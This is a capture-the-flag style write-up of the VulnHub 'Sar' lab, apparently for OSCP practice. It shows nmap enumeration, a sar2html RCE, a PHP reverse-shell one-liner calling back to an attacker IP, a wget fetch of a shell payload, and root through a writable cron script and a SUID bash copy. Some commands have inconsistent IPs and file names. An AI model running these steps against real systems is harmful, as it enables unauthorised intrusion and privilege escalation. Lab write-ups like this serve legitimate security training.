---
title: WRITE-UP Sar
date: 2024-08-02 00:00:01 +0700
categories: [write up, vulnhub, red team, oscp]
tags: [vulnhub]     # TAG names should always be lowercase
---

# Write-Up Sar

## 1. Enumeration
i used netdicover to see where is my lab

![alt text](/assets/img/sar/sar_netdiscover.png)

ip : ```192.168.100.14 ```

i used nmap to see port open 

```terminal
sudo nmap -sC -sV -vvv -p- --min-rate=1000 192.168.100.14
```

*   sC : Enable default script to quick and safe
*   sV : Detect service
*   vvv : increase verbosity
*   p : port to scan "-p-" is all port 1-65535
*   min-rate=1000 : packets are sent < 1000s
  
Only ```80``` http

![alt text](/assets/img/sar/sar_80.png)

it /assets/img/sar/sar2html 3.2.1 was vuln RCE in param ```plot```

![alt text](/assets/img/sar/sar_rce.png)

spawn reverse shell and TTy
```
php -r '$sock=fsockopen("192.168.100.7",3008);exec("sh <&3 >&3 2>&3");'

python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

![alt text](/assets/img/sar/sar_reverse.png)

server run ```crontab``` with sudo user 

![alt text](/assets/img/sar/sar_crontab.png)

```finally.sh``` i can't edit but ```write.sh``` is true

so i go ```root``` with 2 ways

first i sent reverse shell to server and request ```write.sh ``` run it

``` my client _ revershell port 3008 name is shell2
python3 -m http.server 80  
after get shell
nc -nlvp 3008
```

``` vic_client
wget http://192.169.100.7/shell2.php
echo "php shell2.php" >> write.php
```

![alt text](/assets/img/sar/sar_root_1.png)

second i change file ``` write.sh ``` like that 

```
#!/bin/sh

cp /bin/bash /var/www/html/nagibash
chmod u+s /var/www/html/nagibash
```

after create ```nagibash``` with ```crontab``` wb can go to root with euid ```./nagibash -p```

![alt text](/assets/img/sar/sar_root_2.png)

## GG